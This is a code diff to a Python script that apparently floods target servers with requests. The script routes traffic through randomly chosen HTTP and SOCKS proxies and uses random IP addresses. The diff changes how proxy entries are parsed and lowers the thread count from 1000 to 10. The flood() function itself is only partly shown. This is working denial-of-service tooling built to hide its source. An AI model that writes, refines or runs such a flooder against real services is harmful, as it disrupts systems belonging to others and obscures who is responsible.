@@ -20,12 +20,11 @@ def get_random_ip():
     return ".".join(map(str, (random.randint(0, 255) for _ in range(4))))
 
 def get_proxy():
-    proxy_url = random.choice(proxies_list)
-    if proxy_url.startswith("http://") or proxy_url.startswith("https://"):
-        return {"http": proxy_url, "https": proxy_url}
-    elif proxy_url.startswith("socks4://"):
-        return {"http": proxy_url, "https": proxy_url}
-    elif proxy_url.startswith("socks5://"):
+    proxy_entry = random.choice(proxies_list)
+    proxy_parts = proxy_entry.split(':')
+    if proxy_parts[0] in ['http', 'https', 'socks4', 'socks5']:
+        proxy_type = proxy_parts[0]
+        proxy_url = f"{proxy_type}://{':'.join(proxy_parts[1:])}"
         return {"http": proxy_url, "https": proxy_url}
     return None
 
@@ -64,7 +63,7 @@ def flood():
         else:
             print("Invalid proxy format.")
 
-num_threads = 1000
+num_threads = 10
 
 threads = []
 for _ in range(num_threads):
